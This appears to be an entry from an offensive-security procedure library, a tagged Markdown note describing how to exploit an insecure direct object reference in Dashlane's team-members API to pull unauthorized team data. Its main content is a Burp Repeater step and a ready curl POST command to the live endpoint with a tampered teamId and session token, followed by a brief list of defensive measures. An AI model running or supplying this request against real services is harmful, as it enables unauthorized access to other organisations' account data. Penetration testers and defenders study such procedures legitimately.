---
id: uuid-send-modified
tags:
  - api-call
  - exploit-execution
  - http-post
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-dashlane-team-members]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Web Protocols]]'
updated_at: '2025-12-14T17:28:59.256Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Web Protocols]]'
---
# Send-Modified-API-Request

## Summary

Transmit the tampered API request to the Dashlane server to retrieve unauthorized team member data via IDOR.

## Description

Using Burp Repeater or equivalent curl, send the POST request to the members endpoint. Success indicates lack of auth checks on teamId.

## Requirements

1. Modified request ready in Repeater
2. Valid arbitrary teamId

## Defense

Defensive measures and detection strategies:

- API gateway with auth enforcement
- Response filtering for sensitive fields
- Intrusion detection on anomalous parameter values

## Objectives

1. Execute the exploit
2. Receive unauthorized data
3. Confirm vulnerability

## Instructions

### Step 1: Forward in Repeater

**Context**: Send the payload.

**Instructions**: Click 'Send' in Burp Repeater to POST the modified request.

### Step 2: Alternative with Curl

**Context**: For non-proxy testing.

**Instructions**: Execute [[commands/curl-dashlane-team-members]]:

```bash
curl -X POST 'https://ws1.dashlane.com/1/teamPlans/members' -H 'Content-Type: application/x-www-form-urlencoded' -d 'limit=0&login=example@email.com&orderBy=login&teamId=12345&uki=session_token'
```

> Expect JSON response if successful.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Web Protocols]]

### Sub-Techniques


## Commands Used

- [[commands/curl-dashlane-team-members]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- execution
- post
